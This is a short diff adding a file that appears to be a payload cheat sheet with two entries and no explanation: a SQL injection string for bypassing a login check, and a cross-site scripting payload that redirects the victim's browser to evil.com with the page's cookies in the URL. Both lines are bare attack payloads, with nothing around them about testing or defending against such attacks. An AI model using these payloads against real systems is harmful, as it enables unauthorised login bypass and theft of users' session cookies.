@@ -1,0 +1,3 @@
+Bypass SQL Injection : '=''or'
+
+XSS Redirect : <script>window.location = "http://evil.com/?coookie=" + document.cookie;</script>
